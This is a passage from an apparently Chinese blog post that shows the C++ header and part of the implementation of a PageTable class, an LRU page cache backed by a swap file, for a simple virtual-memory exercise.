and</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token comment\">//    and the page is marked as most recently used in the cache</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  <span class=\"token comment\">// 2. The page is not currently \"loaded\", and the PageTable</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  <span class=\"token comment\">//    has not reached its page capacity:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  <span class=\"token comment\">//    In this case, the page is loaded from the swap file and added</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>  <span class=\"token comment\">//    to the cache as the most recently used page.</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>  <span class=\"token comment\">// 3. The page is not currently \"loaded\", and the PageTable</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  <span class=\"token comment\">//    is at page capacity:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  <span class=\"token comment\">//    The least recently used page in the cache is evicted from the</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>  <span class=\"token comment\">//    cache. Afterwards the requested page is loaded from the swap file</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>  <span class=\"token comment\">//    and added to the cache as the most recently used page.</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token comment\">// NOTE: What decides how recntly used a page was used is entirely</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  <span class=\"token comment\">// decided by how recntly it was returned by a call to get_page.</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  <span class=\"token comment\">//   - virtual_address: A virtual address that is associated</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>  <span class=\"token comment\">//     with a requested page. The virutal address is represented</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  <span class=\"token comment\">//     as a unsigned 32 bit integer. NOTE: a virtual address</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  <span class=\"token comment\">//     is NOT the same as a page number. Multiple virtual addresses</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>  <span class=\"token comment\">//     could be associated with the same page number.</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>  <span class=\"token comment\">// Returns:</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>  <span class=\"token comment\">//   - the requested page, which is loaded into the cache and</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>  <span class=\"token comment\">//     marked as the most recently used page</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>  Page<span class=\"token operator\">&amp;</span> <span class=\"token function\">get_page</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> virtual_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>  <span class=\"token comment\">// Returns the page capacity of the page table</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>  <span class=\"token comment\">// Returns: the page capacity of the page table</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>  size_t <span class=\"token function\">capacity</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>  <span class=\"token comment\">// Returns the number of pages currently loaded into \"physical memory\"</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>  <span class=\"token comment\">// Returns: the number of pages currently loaded into \"physical memory\"</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>  size_t <span class=\"token function\">loaded_pages</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>  <span class=\"token comment\">// Checks to see if the specified page is loaded into memory</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>  <span class=\"token comment\">// Arguments: The virtual page number of the page to check for</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>  <span class=\"token comment\">// Returns: True iff the page is loaded into memory, false otherwise</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>  <span class=\"token keyword\">bool</span> <span class=\"token function\">page_available</span><span class=\"token punctuation\">(</span>pno_t virtual_pno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>  <span class=\"token comment\">// Makes sure that all currently loaded pages are flushed</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>  <span class=\"token comment\">// meaning tha the page contents are updated on the swap file.</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>  <span class=\"token comment\">// This should not affect how recently used each page is and all pages</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>  <span class=\"token comment\">// will remain loaded into memory after this operation is performed.</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>  <span class=\"token comment\">// Returns: Nothing</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token function\">flush_all_pages</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>  <span class=\"token comment\">// Flushes the specified page to the swap file.</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>  <span class=\"token comment\">// This should not affect how recently used each page is and all pages</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>  <span class=\"token comment\">// will remain loaded into memory after this operation is performed.</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>  <span class=\"token comment\">// Arguments: the virtual page number of the page to flush</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>  <span class=\"token comment\">// Returns: Nothing</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token function\">flush_page</span><span class=\"token punctuation\">(</span>pno_t virtual_pno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>  <span class=\"token comment\">// Discards the specified page from the PageTable.</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>  <span class=\"token comment\">// If the page is dirty, then it is flushed before it is discarded.</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>  <span class=\"token comment\">// If the page is not in the table, then nothing happens.</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>  <span class=\"token comment\">// Arguments: the virtual page number of the page to discard.</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>  <span class=\"token comment\">// Returns: Nothing</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token function\">discard_page</span><span class=\"token punctuation\">(</span>pno_t virtual_pno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>  <span class=\"token comment\">// Evicts a page from the PageTable. The page evicted</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>  <span class=\"token comment\">// should be the least recntly used page in the cache.</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>  <span class=\"token comment\">// If the evicted page is dirty, then it is flushed before it is evicted.</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>  <span class=\"token comment\">// If there are no pages in the cache, then do nothing.</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>  <span class=\"token comment\">// Returns: Nothing</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token function\">evict_page</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre> <span class=\"token keyword\">private</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>  <span class=\"token comment\">// The swap file where pages are stored</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>  fstream swap_file_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>  <span class=\"token comment\">// The number of pages that can be stored</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>  <span class=\"token comment\">// in the PageTable at one time.</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>  size_t capacity_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>  <span class=\"token comment\">// TODO: add fields</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>  size_t page_num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>  <span class=\"token comment\">// a vector to store pages in physical memory</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>  std<span class=\"token double-colon punctuation\">::</span>list<span class=\"token operator\">&lt;</span>std<span class=\"token double-colon punctuation\">::</span>pair<span class=\"token operator\">&lt;</span>pno_t<span class=\"token punctuation\">,</span>Page<span class=\"token operator\">*</span><span class=\"token operator\">>></span> page_list<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>  <span class=\"token comment\">// use an unordered_map to quickly determined the corresponding page</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>  std<span class=\"token double-colon punctuation\">::</span>unordered_map<span class=\"token operator\">&lt;</span>pno_t<span class=\"token punctuation\">,</span>Page<span class=\"token operator\">*</span><span class=\"token operator\">></span> mp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre></pre></td></tr><tr><td data-num=\"164\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre></pre></td></tr><tr><td data-num=\"166\"></td><td><pre></pre></td></tr><tr><td data-num=\"167\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span>  <span class=\"token comment\">// PAGE_TABLE_H_</span></span></pre></td></tr></table></figure><h2 id=\"pagetablecc实现\"><a class=\"markdownIt-Anchor\" href=\"#pagetablecc实现\">#</a>  <code>PageTable.cc</code>  实现</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"./PageTable.h\"</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"./Page.h\"</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">namespace</span> simplevm <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">// TODO: implment PageTable member functions</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// Constructs a new page table with the specified</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">// swap file and the specified page capacity, which is</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">// the number of pages that can be held in memory</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">// at one time. There cannot be more than page_capacity</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token comment\">// number of pages loaded in at a time.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">//   - swap_file_name: the name of the swap_file</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">//   - page_capacity: the maximum number of pages that can be held</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">//     in memory at one time.</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token class-name\">PageTable</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">PageTable</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span>string swap_file_name<span class=\"token punctuation\">,</span> size_t page_capacity<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    swap_file_<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>swap_file_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>capacity_ <span class=\"token operator\">=</span> page_capacity<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>page_num <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token comment\">// Destructs the page table, freeing any allocated resources</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token comment\">// and flushing any pages currently loaded into memory that</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\">// are dirty</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token class-name\">PageTable</span><span class=\"token double-colon punctuation\">::</span><span class=\"token operator\">~</span><span class=\"token function\">PageTable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>page_num <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        Page<span class=\"token operator\">*</span> deleted_page <span class=\"token operator\">=</span> page_list<span class=\"token punctuation\">.</span><span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>second<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        page_list<span class=\"token punctuation\">.</span><span class=\"token function\">pop_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        deleted_page<span class=\"token operator\">-></span><span class=\"token operator\">~</span><span class=\"token function\">Page</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        page_num <span class=\"token operator\">-=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    mp<span class=\"token punctuation\">.</span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    page_list<span class=\"token punctuation\">.</span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token comment\">// Given a virtual address, gets the associated</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token comment\">// page for that virtual address. This page will</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token comment\">// be \"loaded\" into physical memory by the time it</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token comment\">// is returned.</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token comment\">// There are three possiblities when a page is requested:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token comment\">// 1. The page is currently in the \"loaded\" and in the cache.</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token comment\">//    In this case, a reference to the page is returned and</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token comment\">//    and the page is marked as most recently used in the cache</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token comment\">// 2. The page is not currently \"loaded\", and the PageTable</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token comment\">//    has not reached its page capacity:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token comment\">//    In this case, the page is loaded from the swap file and added</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token comment\">//    to the cache as the most recently used page.</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token comment\">// 3. The page is not currently \"loaded\", and the PageTable</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token comment\">//    is at page capacity:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  <span class=\"token comment\">//    The least recently used page in the cache is evicted from the</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token comment\">//    cache. Afterwards the requested page is loaded from the swap file</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token comment\">//    and added to the cache as the most recently used page.</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token comment\">// NOTE: What decides how recntly used a page was used is entirely</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  <span class=\"token comment\">// decided by how recntly it was returned by a call to get_page.</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token comment\">//   - virtual_address: A virtual address that is associated</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  <span class=\"token comment\">//     with a requested page. The virutal address is represented</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token comment\">//     as a unsigned 32 bit integer. NOTE: a virtual address</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  <span class=\"token comment\">//     is NOT the same as a page number. Multiple virtual addresses</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  <span class=\"token comment\">//     could be associated with the same page number.</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>  <span class=\"token comment\">// Returns:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>  <span class=\"token comment\">//   - the requested page, which is loaded into the cache and</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  <span class=\"token comment\">//     marked as the most recently used page</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  Page<span class=\"token operator\">&amp;</span> <span class=\"token class-name\">PageTable</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">get_page</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> virtual_address<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token comment\">// obtain the virtual_pno according to the virtual address</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    pno_t pno <span class=\"token operator\">=</span> virtual_address <span class=\"token operator\">/</span> Page<span class=\"token double-colon punctuation\">::</span>PAGE_SIZE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">page_available</span><span class=\"token punctuation\">(</span>pno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        Page<span class=\"token operator\">*</span> p <span class=\"token operator\">=</span> mp<span class=\"token punctuation\">[</span>pno<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        page_list<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span>pno<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        page_list<span class=\"token punctuation\">.</span><span class=\"token function\">push_front</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span>pno<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        Page<span class=\"token operator\">*</span> pg <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token function\">Page</span><span class=\"token punctuation\">(</span>swap_file_<span class=\"token punctuation\">,</span>pno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>page_num <span class=\"token operator\">&lt;</span> capacity_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>            page_list<span class=\"token punctuation\">.</span><span class=\"token function\">push_front</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span>pno<span class=\"token punctuation\">,</span>pg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>            <span class=\"token function\">flush_page</span><span class=\"token punctuation\">(</span>pno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>            page_num <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>            <span class=\"token comment\">// LRU Algorithms</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>            <span class=\"token comment\">// evict the oldest page, and flush it</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token function\">evict_page</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>            <span class=\"token comment\">// add the new page to the front of the list</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>            page_list<span class=\"token punctuation\">.</span><span class=\"token function\">push_front</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">make_pair</span><span class=\"token punctuation\">(</span>pno<span class=\"token punctuation\">,</span>pg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>            page_num <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>        mp<span class=\"token punctuation\">[</span>pno<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pg<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>mp<span class=\"token punctuation\">[</span>pno<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>  <span class=\"token comment\">// Returns the page capacity of the page table</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>  <span class=\"token comment\">// Returns: the page capacity of the page table</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>  size_t <span class=\"token class-name\">PageTable</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">capacity</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token keyword\">return</span> capacity_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>  <span class=\"token comment\">// Returns the number of pages currently loaded into \"physical memory\"</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>  <span class=\"token comment\">// Returns: the number of pages currently loaded into \"physical 